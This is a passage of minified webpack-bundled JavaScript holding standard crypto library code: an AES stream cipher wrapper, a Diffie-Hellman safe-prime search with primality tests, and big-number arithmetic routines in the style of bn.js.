        function StreamCipher(mode, key, iv, decrypt) {
            Transform.call(this), (this._cipher = new aes.AES(key)), (this._prev = Buffer.from(iv)), (this._cache = Buffer.allocUnsafe(0)), (this._secCache = Buffer.allocUnsafe(0)), (this._decrypt = decrypt), (this._mode = mode);
        }
        __webpack_require__(3)(StreamCipher, Transform),
            (StreamCipher.prototype._update = function (chunk) {
                return this._mode.encrypt(this, chunk, this._decrypt);
            }),
            (StreamCipher.prototype._final = function () {
                this._cipher.scrub();
            }),
            (module.exports = StreamCipher);
    },
    function (module, exports, __webpack_require__) {
        var randomBytes = __webpack_require__(24);
        (module.exports = findPrime), (findPrime.simpleSieve = simpleSieve), (findPrime.fermatTest = fermatTest);
        var BN = __webpack_require__(111),
            TWENTYFOUR = new BN(24),
            millerRabin = new (__webpack_require__(112))(),
            ONE = new BN(1),
            TWO = new BN(2),
            FIVE = new BN(5),
            TEN = (new BN(16), new BN(8), new BN(10)),
            THREE = new BN(3),
            ELEVEN = (new BN(7), new BN(11)),
            FOUR = new BN(4),
            primes = (new BN(12), null);
        function _getPrimes() {
            if (null !== primes) return primes;
            var res = [];
            res[0] = 2;
            for (var i = 1, k = 3; k < 1048576; k += 2) {
                for (var sqrt = Math.ceil(Math.sqrt(k)), j = 0; j < i && res[j] <= sqrt && k % res[j] != 0; j++);
                (i !== j && res[j] <= sqrt) || (res[i++] = k);
            }
            return (primes = res), res;
        }
        function simpleSieve(p) {
            for (var primes = _getPrimes(), i = 0; i < primes.length; i++) if (0 === p.modn(primes[i])) return 0 === p.cmpn(primes[i]);
            return !0;
        }
        function fermatTest(p) {
            var red = BN.mont(p);
            return 0 === TWO.toRed(red).redPow(p.subn(1)).fromRed().cmpn(1);
        }
        function findPrime(bits, gen) {
            if (bits < 16) return new BN(2 === gen || 5 === gen ? [140, 123] : [140, 39]);
            var num, n2;
            for (gen = new BN(gen); ; ) {
                for (num = new BN(randomBytes(Math.ceil(bits / 8))); num.bitLength() > bits; ) num.ishrn(1);
                if ((num.isEven() && num.iadd(ONE), num.testn(1) || num.iadd(TWO), gen.cmp(TWO))) {
                    if (!gen.cmp(FIVE)) for (; num.mod(TEN).cmp(THREE); ) num.iadd(FOUR);
                } else for (; num.mod(TWENTYFOUR).cmp(ELEVEN); ) num.iadd(FOUR);
                if (simpleSieve((n2 = num.shrn(1))) && simpleSieve(num) && fermatTest(n2) && fermatTest(num) && millerRabin.test(n2) && millerRabin.test(num)) return num;
            }
        }
    },
    function (module, exports, __webpack_require__) {
        (function (module) {
            !(function (module, exports) {
                "use strict";
                function assert(val, msg) {
                    if (!val) throw new Error(msg || "Assertion failed");
                }
                function inherits(ctor, superCtor) {
                    ctor.super_ = superCtor;
                    var TempCtor = function () {};
                    (TempCtor.prototype = superCtor.prototype), (ctor.prototype = new TempCtor()), (ctor.prototype.constructor = ctor);
                }
                function BN(number, base, endian) {
                    if (BN.isBN(number)) return number;
                    (this.negative = 0),
                        (this.words = null),
                        (this.length = 0),
                        (this.red = null),
                        null !== number && (("le" !== base && "be" !== base) || ((endian = base), (base = 10)), this._init(number || 0, base || 10, endian || "be"));
                }
                var Buffer;
                "object" == typeof module ? (module.exports = BN) : (exports.BN = BN), (BN.BN = BN), (BN.wordSize = 26);
                try {
                    Buffer = "undefined" != typeof window && void 0 !== window.Buffer ? window.Buffer : __webpack_require__(234).Buffer;
                } catch (e) {}
                function parseHex4Bits(string, index) {
                    var c = string.charCodeAt(index);
                    return c >= 65 && c <= 70 ? c - 55 : c >= 97 && c <= 102 ? c - 87 : (c - 48) & 15;
                }
                function parseHexByte(string, lowerBound, index) {
                    var r = parseHex4Bits(string, index);
                    return index - 1 >= lowerBound && (r |= parseHex4Bits(string, index - 1) << 4), r;
                }
                function parseBase(str, start, end, mul) {
                    for (var r = 0, len = Math.min(str.length, end), i = start; i < len; i++) {
                        var c = str.charCodeAt(i) - 48;
                        (r *= mul), (r += c >= 49 ? c - 49 + 10 : c >= 17 ? c - 17 + 10 : c);
                    }
                    return r;
                }
                (BN.isBN = function (num) {
                    return num instanceof BN || (null !== num && "object" == typeof num && num.constructor.wordSize === BN.wordSize && Array.isArray(num.words));
                }),
                    (BN.max = function (left, right) {
                        return left.cmp(right) > 0 ? left : right;
                    }),
                    (BN.min = function (left, right) {
                        return left.cmp(right) < 0 ? left : right;
                    }),
                    (BN.prototype._init = function (number, base, endian) {
                        if ("number" == typeof number) return this._initNumber(number, base, endian);
                        if ("object" == typeof number) return this._initArray(number, base, endian);
                        "hex" === base && (base = 16), assert(base === (0 | base) && base >= 2 && base <= 36);
                        var start = 0;
                        "-" === (number = number.toString().replace(/\s+/g, ""))[0] && (start++, (this.negative = 1)),
                            start < number.length && (16 === base ? this._parseHex(number, start, endian) : (this._parseBase(number, base, start), "le" === endian && this._initArray(this.toArray(), base, endian)));
                    }),
                    (BN.prototype._initNumber = function (number, base, endian) {
                        number < 0 && ((this.negative = 1), (number = -number)),
                            number < 67108864
                                ? ((this.words = [67108863 & number]), (this.length = 1))
                                : number < 4503599627370496
                                ? ((this.words = [67108863 & number, (number / 67108864) & 67108863]), (this.length = 2))
                                : (assert(number < 9007199254740992), (this.words = [67108863 & number, (number / 67108864) & 67108863, 1]), (this.length = 3)),
                            "le" === endian && this._initArray(this.toArray(), base, endian);
                    }),
                    (BN.prototype._initArray = function (number, base, endian) {
                        if ((assert("number" == typeof number.length), number.length <= 0)) return (this.words = [0]), (this.length = 1), this;
                        (this.length = Math.ceil(number.length / 3)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var j,
                            w,
                            off = 0;
                        if ("be" === endian)
                            for (i = number.length - 1, j = 0; i >= 0; i -= 3)
                                (w = number[i] | (number[i - 1] << 8) | (number[i - 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        else if ("le" === endian)
                            for (i = 0, j = 0; i < number.length; i += 3)
                                (w = number[i] | (number[i + 1] << 8) | (number[i + 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        return this.strip();
                    }),
                    (BN.prototype._parseHex = function (number, start, endian) {
                        (this.length = Math.ceil((number.length - start) / 6)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var w,
                            off = 0,
                            j = 0;
                        if ("be" === endian)
                            for (i = number.length - 1; i >= start; i -= 2) (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        else
                            for (i = (number.length - start) % 2 == 0 ? start + 1 : start; i < number.length; i += 2)
                                (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        this.strip();
                    }),
                    (BN.prototype._parseBase = function (number, base, start) {
                        (this.words = [0]), (this.length = 1);
                        for (var limbLen = 0, limbPow = 1; limbPow <= 67108863; limbPow *= base) limbLen++;
                        limbLen--, (limbPow = (limbPow / base) | 0);
                        for (var total = number.length - start, mod = total % limbLen, end = Math.min(total, total - mod) + start, word = 0, i = start; i < end; i += limbLen)
                            (word = parseBase(number, i, i + limbLen, base)), this.imuln(limbPow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        if (0 !== mod) {
                            var pow = 1;
                            for (word = parseBase(number, i, number.length, base), i = 0; i < mod; i++) pow *= base;
                            this.imuln(pow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        }
                        this.strip();
                    }),
                    (BN.prototype.copy = function (dest) {
                        dest.words = new Array(this.length);
                        for (var i = 0; i < this.length; i++) dest.words[i] = this.words[i];
                        (dest.length = this.length), (dest.negative = this.negative), (dest.red = this.red);
                    }),
                    (BN.prototype.clone = function () {
                        var r = new BN(null);
                        return this.copy(r), r;
                    }),
                    (BN.prototype._expand = function (size) {
                        for (; this.length < size; ) this.words[this.length++] = 0;
                        return this;
                    }),
                    (BN.prototype.strip = function () {
                        for (; this.length > 1 && 0 === this.words[this.length - 1]; ) this.length--;
                        return this._normSign();
                    }),
                    (BN.prototype._normSign = function () {
                        return 1 === this.length && 0 === this.words[0] && (this.negative = 0), this;
                    }),
                    (BN.prototype.inspect = function () {
                        return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">";
                    });
                var zeros = [
                        "",
                        "0",
                        "00",
                        "000",
                        "0000",
                        "00000",
                        "000000",
                        "0000000",
                        "00000000",
                        "000000000",
                        "0000000000",
                        "00000000000",
                        "000000000000",
                        "0000000000000",
                        "00000000000000",
                        "000000000000000",
                        "0000000000000000",
                        "00000000000000000",
                        "000000000000000000",
                        "0000000000000000000",
                        "00000000000000000000",
                        "000000000000000000000",
                        "0000000000000000000000",
                        "00000000000000000000000",
                        "000000000000000000000000",
                        "0000000000000000000000000",
                    ],
                    groupSizes = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5],
                    groupBases = [
                        0,
                        0,
                        33554432,
                        43046721,
                        16777216,
                        48828125,
                        60466176,
                        40353607,
                        16777216,
                        43046721,
                        1e7,
                        19487171,
                        35831808,
                        62748517,
                        7529536,
                        11390625,
                        16777216,
                        24137569,
                        34012224,
                        47045881,
                        64e6,
                        4084101,
                        5153632,
                        6436343,
                        7962624,
                        9765625,
                        11881376,
                        14348907,
                        17210368,
                        20511149,
                        243e5,
                        28629151,
                        33554432,
                        39135393,
                        45435424,
                        52521875,
                        60466176,
                    ];
                function smallMulTo(self, num, out) {
                    out.negative = num.negative ^ self.negative;
                    var len = (self.length + num.length) | 0;
                    (out.length = len), (len = (len - 1) | 0);
                    var a = 0 | self.words[0],
                        b = 0 | num.words[0],
                        r = a * b,
                        lo = 67108863 & r,
                        carry = (r / 67108864) | 0;
                    out.words[0] = lo;
                    for (var k = 1; k < len; k++) {
                        for (var ncarry = carry >>> 26, rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                            var i = (k - j) | 0;
                            (ncarry += ((r = (a = 0 | self.words[i]) * (b = 0 | num.words[j]) + rword) / 67108864) | 0), (rword = 67108863 & r);
                        }
                        (out.words[k] = 0 | rword), (carry = 0 | ncarry);
                    }
                    return 0 !== carry ? (out.words[k] = 0 | carry) : out.length--, out.strip();
                }
                (BN.prototype.toString = function (base, padding) {
                    var out;
                    if (((padding = 0 | padding || 1), 16 === (base = base || 10) || "hex" === base)) {
                        out = "";
                        for (var off = 0, carry = 0, i = 0; i < this.length; i++) {
                            var w = this.words[i],
                                word = (16777215 & ((w << off) | carry)).toString(16);
                            (out = 0 !== (carry = (w >>> (24 - off)) & 16777215) || i !== this.length - 1 ? zeros[6 - word.length] + word + out : word + out), (off += 2) >= 26 && ((off -= 26), i--);
                        }
                        for (0 !== carry && (out = carry.toString(16) + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    if (base === (0 | base) && base >= 2 && base <= 36) {
                        var groupSize = groupSizes[base],
                            groupBase = groupBases[base];
                        out = "";
                        var c = this.clone();
                        for (c.negative = 0; !c.isZero(); ) {
                            var r = c.modn(groupBase).toString(base);
                            out = (c = c.idivn(groupBase)).isZero() ? r + out : zeros[groupSize - r.length] + r + out;
                        }
                        for (this.isZero() && (out = "0" + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    assert(!1, "Base should be between 2 and 36");
                }),
                    (BN.prototype.toNumber = function () {
                        var ret = this.words[0];
                        return (
                            2 === this.length
                                ? (ret += 67108864 * this.words[1])
                                : 3 === this.length && 1 === this.words[2]
                                ? (ret += 4503599627370496 + 67108864 * this.words[1])
                                : this.length > 2 && assert(!1, "Number can only safely store up to 53 bits"),
                            0 !== this.negative ? -ret : ret
                        );
                    }),
                    (BN.prototype.toJSON = function () {
                        return this.toString(16);
                    }),
                    (BN.prototype.toBuffer = function (endian, length) {
                        return assert(void 0 !== Buffer), this.toArrayLike(Buffer, endian, length);
                    }),
                    (BN.prototype.toArray = function (endian, length) {
                        return this.toArrayLike(Array, endian, length);
                    }),
                    (BN.prototype.toArrayLike = function (ArrayType, endian, length) {
                        var byteLength = this.byteLength(),
                            reqLength = length || Math.max(1, byteLength);
                        assert(byteLength <= reqLength, "byte array longer than desired length"), assert(reqLength > 0, "Requested array length <= 0"), this.strip();
                        var b,
                            i,
                            littleEndian = "le" === endian,
                            res = new ArrayType(reqLength),
                            q = this.clone();
                        if (littleEndian) {
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[i] = b);
                            for (; i < reqLength; i++) res[i] = 0;
                        } else {
                            for (i = 0; i < reqLength - byteLength; i++) res[i] = 0;
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[reqLength - i - 1] = b);
                        }
                        return res;
                    }),
                    Math.clz32
                        ? (BN.prototype._countBits = function (w) {
                              return 32 - Math.clz32(w);
                          })
                        : (BN.prototype._countBits = function (w) {
                              var t = w,
                                  r = 0;
                              return t >= 4096 && ((r += 13), (t >>>= 13)), t >= 64 && ((r += 7), (t >>>= 7)), t >= 8 && ((r += 4), (t >>>= 4)), t >= 2 && ((r += 2), (t >>>= 2)), r + t;
                          }),
                    (BN.prototype._zeroBits = function (w) {
                        if (0 === w) return 26;
                        var t = w,
                            r = 0;
                        return 0 == (8191 & t) && ((r += 13), (t >>>= 13)), 0 == (127 & t) && ((r += 7), (t >>>= 7)), 0 == (15 & t) && ((r += 4), (t >>>= 4)), 0 == (3 & t) && ((r += 2), (t >>>= 2)), 0 == (1 & t) && r++, r;
                    }),
                    (BN.prototype.bitLength = function () {
                        var w = this.words[this.length - 1],
                            hi = this._countBits(w);
                        return 26 * (this.length - 1) + hi;
                    }),
                    (BN.prototype.zeroBits = function () {
                        if (this.isZero()) return 0;
                        for (var r = 0, i = 0; i < this.length; i++) {
                            var b = this._zeroBits(this.words[i]);
                            if (((r += b), 26 !== b)) break;
                        }
                        return r;
                    }),
                    (BN.prototype.byteLength = function () {
                        return Math.ceil(this.bitLength() / 8);
                    }),
                    (BN.prototype.toTwos = function (width) {
                        return 0 !== this.negative ? this.abs().inotn(width).iaddn(1) : this.clone();
                    }),
                    (BN.prototype.fromTwos = function (width) {
                        return this.testn(width - 1) ? this.notn(width).iaddn(1).ineg() : this.clone();
                    }),
                    (BN.prototype.isNeg = function () {
                        return 0 !== this.negative;
                    }),
                    (BN.prototype.neg = function () {
                        return this.clone().ineg();
                    }),
                    (BN.prototype.ineg = function () {
                        return this.isZero() || (this.negative ^= 1), this;
                    }),
                    (BN.prototype.iuor = function (num) {
                        for (; this.length < num.length; ) this.words[this.length++] = 0;
                        for (var i = 0; i < num.length; i++) this.words[i] = this.words[i] | num.words[i];
                        return this.strip();
                    }),
                    (BN.prototype.ior = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuor(num);
                    }),
                    (BN.prototype.or = function (num) {
                        return this.length > num.length ? this.clone().ior(num) : num.clone().ior(this);
                    }),
                    (BN.prototype.uor = function (num) {
                        return this.length > num.length ? this.clone().iuor(num) : num.clone().iuor(this);
                    }),
                    (BN.prototype.iuand = function (num) {
                        var b;
                        b = this.length > num.length ? num : this;
                        for (var i = 0; i < b.length; i++) this.words[i] = this.words[i] & num.words[i];
                        return (this.length = b.length), this.strip();
                    }),
                    (BN.prototype.iand = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuand(num);
                    }),
                    (BN.prototype.and = function (num) {
                        return this.length > num.length ? this.clone().iand(num) : num.clone().iand(this);
                    }),
                    (BN.prototype.uand = function (num) {
                        return this.length > num.length ? this.clone().iuand(num) : num.clone().iuand(this);
                    }),
                    (BN.prototype.iuxor = function (num) {
                        var a, b;
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var i = 0; i < b.length; i++) this.words[i] = a.words[i] ^ b.words[i];
                        if (this !== a) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = a.length), this.strip();
                    }),
                    (BN.prototype.ixor = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuxor(num);
                    }),
                    (BN.prototype.xor = function (num) {
                        return this.length > num.length ? this.clone().ixor(num) : num.clone().ixor(this);
                    }),
                    (BN.prototype.uxor = function (num) {
                        return this.length > num.length ? this.clone().iuxor(num) : num.clone().iuxor(this);
                    }),
                    (BN.prototype.inotn = function (width) {
                        assert("number" == typeof width && width >= 0);
                        var bytesNeeded = 0 | Math.ceil(width / 26),
                            bitsLeft = width % 26;
                        this._expand(bytesNeeded), bitsLeft > 0 && bytesNeeded--;
                        for (var i = 0; i < bytesNeeded; i++) this.words[i] = 67108863 & ~this.words[i];
                        return bitsLeft > 0 && (this.words[i] = ~this.words[i] & (67108863 >> (26 - bitsLeft))), this.strip();
                    }),
                    (BN.prototype.notn = function (width) {
                        return this.clone().inotn(width);
                    }),
                    (BN.prototype.setn = function (bit, val) {
                        assert("number" == typeof bit && bit >= 0);
                        var off = (bit / 26) | 0,
                            wbit = bit % 26;
                        return this._expand(off + 1), (this.words[off] = val ? this.words[off] | (1 << wbit) : this.words[off] & ~(1 << wbit)), this.strip();
                    }),
                    (BN.prototype.iadd = function (num) {
                        var r, a, b;
                        if (0 !== this.negative && 0 === num.negative) return (this.negative = 0), (r = this.isub(num)), (this.negative ^= 1), this._normSign();
                        if (0 === this.negative && 0 !== num.negative) return (num.negative = 0), (r = this.isub(num)), (num.negative = 1), r._normSign();
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (r = (0 | a.words[i]) + (0 | b.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        for (; 0 !== carry && i < a.length; i++) (r = (0 | a.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        if (((this.length = a.length), 0 !== carry)) (this.words[this.length] = carry), this.length++;
                        else if (a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return this;
                    }),
                    (BN.prototype.add = function (num) {
                        var res;
                        return 0 !== num.negative && 0 === this.negative
                            ? ((num.negative = 0), (res = this.sub(num)), (num.negative ^= 1), res)
                            : 0 === num.negative && 0 !== this.negative
                            ? ((this.negative = 0), (res = num.sub(this)), (this.negative = 1), res)
                            : this.length > num.length
                            ? this.clone().iadd(num)
                            : num.clone().iadd(this);
                    }),
                    (BN.prototype.isub = function (num) {
                        if (0 !== num.negative) {
                            num.negative = 0;
                            var r = this.iadd(num);
                            return (num.negative = 1), r._normSign();
                        }
                        if (0 !== this.negative) return (this.negative = 0), this.iadd(num), (this.negative = 1), this._normSign();
                        var a,
                            b,
                            cmp = this.cmp(num);
                        if (0 === cmp) return (this.negative = 0), (this.length = 1), (this.words[0] = 0), this;
                        cmp > 0 ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (carry = (r = (0 | a.words[i]) - (0 | b.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        for (; 0 !== carry && i < a.length; i++) (carry = (r = (0 | a.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        if (0 === carry && i < a.length && a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = Math.max(this.length, i)), a !== this && (this.negative = 1), this.strip();
                    }),
                    (BN.prototype.sub = function (num) {
                        return this.clone().isub(num);
                    });
                var comb10MulTo = function (self, num, out) {
                    var lo,
                        mid,
                        hi,
                        a = self.words,
                        b = num.words,
                        o = out.words,
                        c = 0,
                        a0 = 0 | a[0],
                        al0 = 8191 & a0,
                        ah0 = a0 >>> 13,
                        a1 = 0 | a[1],
                        al1 = 8191 & a1,
                        ah1 = a1 >>> 13,
                        a2 = 0 | a[2],
                        al2 = 8191 & a2,
                        ah2 = a2 >>> 13,
                        a3 = 0 | a[3],
                        al3 = 8191 & a3,
                        ah3 = a3 >>> 13,
                        a4 = 0 | a[4],
                        al4 = 8191 & a4,
                        ah4 = a4 >>> 13,
                        a5 = 0 | a[5],
                        al5 = 8191 & a5,
                        ah5 = a5 >>> 13,
                        a6 = 0 | a[6],
                        al6 = 8191 & a6,
                        ah6 = a6 >>> 13,
                        a7 = 0 | a[7],
                        al7 = 8191 & a7,
                        ah7 = a7 >>> 13,
                        a8 = 0 | a[8],
                        al8 = 8191 & a8,
                        ah8 = a8 >>> 13,
                        a9 = 0 | a[9],
                        al9 = 8191 & a9,
                        ah9 = a9 >>> 13,
                        b0 = 0 | b[0],
                        bl0 = 8191 & b0,
                        bh0 = b0 >>> 13,
                        b1 = 0 | b[1],
                        bl1 = 8191 & b1,
                        bh1 = b1 >>> 13,
                        b2 = 0 | b[2],
                        bl2 = 8191 & b2,
                        bh2 = b2 >>> 13,
                        b3 = 0 | b[3],
                        bl3 = 8191 & b3,
                        bh3 = b3 >>> 13,
                        b4 = 0 | b[4],
                        bl4 = 8191 & b4,
                        bh4 = b4 >>> 13,
                        b5 = 0 | b[5],
                        bl5 = 8191 & b5,
                        bh5 = b5 >>> 13,
                        b6 = 0 | b[6],
                        bl6 = 8191 & b6,
                        bh6 = b6 >>> 13,
                        b7 = 0 | b[7],
                        bl7 = 8191 & b7,
                        bh7 = b7 >>> 13,
                        b8 = 0 | b[8],
                        bl8 = 8191 & b8,
                        bh8 = b8 >>> 13,
                        b9 = 0 | b[9],
                        bl9 = 8191 & b9,
                        bh9 = b9 >>> 13;
                    (out.negative = self.negative ^ num.negative), (out.length = 19);
                    var w0 = (((c + (lo = Math.imul(al0, bl0))) | 0) + ((8191 & (mid = ((mid = Math.imul(al0, bh0)) + Math.imul(ah0, bl0)) | 0)) << 13)) | 0;
                    (c = ((((hi = Math.imul(ah0, bh0)) + (mid >>> 13)) | 0) + (w0 >>> 26)) | 0), (w0 &= 67108863), (lo = Math.imul(al1, bl0)), (mid = ((mid = Math.imul(al1, bh0)) + Math.imul(ah1, bl0)) | 0), (hi = Math.imul(ah1, bh0));
                    var w1 = (((c + (lo = (lo + Math.imul(al0, bl1)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh1)) | 0) + Math.imul(ah0, bl1)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh1)) | 0) + (mid >>> 13)) | 0) + (w1 >>> 26)) | 0),
                        (w1 &= 67108863),
                        (lo = Math.imul(al2, bl0)),
                        (mid = ((mid = Math.imul(al2, bh0)) + Math.imul(ah2, bl0)) | 0),
                        (hi = Math.imul(ah2, bh0)),
                        (lo = (lo + Math.imul(al1, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh1)) | 0) + Math.imul(ah1, bl1)) | 0),
                        (hi = (hi + Math.imul(ah1, bh1)) | 0);
                    var w2 = (((c + (lo = (lo + Math.imul(al0, bl2)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh2)) | 0) + Math.imul(ah0, bl2)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh2)) | 0) + (mid >>> 13)) | 0) + (w2 >>> 26)) | 0),
                        (w2 &= 67108863),
                        (lo = Math.imul(al3, bl0)),
                        (mid = ((mid = Math.imul(al3, bh0)) + Math.imul(ah3, bl0)) | 0),
                        (hi = Math.imul(ah3, bh0)),
                        (lo = (lo + Math.imul(al2, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh1)) | 0) + Math.imul(ah2, bl1)) | 0),
                        (hi = (hi + Math.imul(ah2, bh1)) | 0),
                        (lo = (lo + Math.imul(al1, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh2)) | 0) + Math.imul(ah1, bl2)) | 0),
                        (hi = (hi + Math.imul(ah1, bh2)) | 0);
                    var w3 = (((c + (lo = (lo + Math.imul(al0, bl3)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh3)) | 0) + Math.imul(ah0, bl3)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh3)) | 0) + (mid >>> 13)) | 0) + (w3 >>> 26)) | 0),
                        (w3 &= 67108863),
                        (lo = Math.imul(al4, bl0)),
                        (mid = ((mid = Math.imul(al4, bh0)) + Math.imul(ah4, bl0)) | 0),
                        (hi = Math.imul(ah4, bh0)),
                        (lo = (lo + Math.imul(al3, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh1)) | 0) + Math.imul(ah3, bl1)) | 0),
                        (hi = (hi + Math.imul(ah3, bh1)) | 0),
                        (lo = (lo + Math.imul(al2, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh2)) | 0) + Math.imul(ah2, bl2)) | 0),
                        (hi = (hi + Math.imul(ah2, bh2)) | 0),
                        (lo = (lo + Math.imul(al1, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh3)) | 0) + Math.imul(ah1, bl3)) | 0),
                        (hi = (hi + Math.imul(ah1, bh3)) | 0);
                    var w4 = (((c + (lo = (lo + Math.imul(al0, bl4)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh4)) | 0) + Math.imul(ah0, bl4)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh4)) | 0) + (mid >>> 13)) | 0) + (w4 >>> 26)) | 0),
                        (w4 &= 67108863),
                        (lo = Math.imul(al5, bl0)),
                        (mid = ((mid = Math.imul(al5, bh0)) + Math.imul(ah5, bl0)) | 0),
                        (hi = Math.imul(ah5, bh0)),
                        (lo = (lo + Math.imul(al4, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh1)) | 0) + Math.imul(ah4, bl1)) | 0),
                        (hi = (hi + Math.imul(ah4, bh1)) | 0),
                        (lo = (lo + Math.imul(al3, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh2)) | 0) + Math.imul(ah3, bl2)) | 0),
                        (hi = (hi + Math.imul(ah3, bh2)) | 0),
                        (lo = (lo + Math.imul(al2, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh3)) | 0) + Math.imul(ah2, bl3)) | 0),
                        (hi = (hi + Math.imul(ah2, bh3)) | 0),
                        (lo = (lo + Math.imul(al1, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh4)) | 0) + Math.imul(ah1, bl4)) | 0),
                        (hi = (hi + Math.imul(ah1, bh4)) | 0);
                    var w5 = (((c + (lo = (lo + Math.imul(al0, bl5)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh5)) | 0) + Math.imul(ah0, bl5)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh5)) | 0) + (mid >>> 13)) | 0) + (w5 >>> 26)) | 0),
                        (w5 &= 67108863),
                        (lo = Math.imul(al6, bl0)),
                        (mid = ((mid = Math.imul(al6, bh0)) + Math.imul(ah6, bl0)) | 0),
                        (hi = Math.imul(ah6, bh0)),
                        (lo = (lo + Math.imul(al5, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh1)) | 0) + Math.imul(ah5, bl1)) | 0),
                        (hi = (hi + Math.imul(ah5, bh1)) | 0),
                        (lo = (lo + Math.imul(al4, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh2)) | 0) + Math.imul(ah4, bl2)) | 0),
                        (hi = (hi + Math.imul(ah4, bh2)) | 0),
                        (lo = (lo + Math.imul(al3, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh3)) | 0) + Math.imul(ah3, bl3)) | 0),
                        (hi = (hi + Math.imul(ah3, bh3)) | 0),
                        (lo = (lo + Math.imul(al2, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh4)) | 0) + Math.imul(ah2, bl4)) | 0),
                        (hi = (hi + Math.imul(ah2, bh4)) | 0),
                        (lo = (lo + Math.imul(al1, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh5)) | 0) + Math.imul(ah1, bl5)) | 0),
                        (hi = (hi + Math.imul(ah1, bh5)) | 0);
                    var w6 = (((c + (lo = (lo + Math.imul(al0, bl6)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh6)) | 0) + Math.imul(ah0, bl6)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh6)) | 0) + (mid >>> 13)) | 0) + (w6 >>> 26)) | 0),
                        (w6 &= 67108863),
                        (lo = Math.imul(al7, bl0)),
                        (mid = ((mid = Math.imul(al7, bh0)) + Math.imul(ah7, bl0)) | 0),
                        (hi = Math.imul(ah7, bh0)),
                        (lo = (lo + Math.imul(al6, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh1)) | 0) + Math.imul(ah6, bl1)) | 0),
                        (hi = (hi + Math.imul(ah6, bh1)) | 0),
                        (lo = (lo + Math.imul(al5, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh2)) | 0) + Math.imul(ah5, bl2)) | 0),
                        (hi = (hi + Math.imul(ah5, bh2)) | 0),
                        (lo = (lo + Math.imul(al4, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh3)) | 0) + Math.imul(ah4, bl3)) | 0),
                        (hi = (hi + Math.imul(ah4, bh3)) | 0),
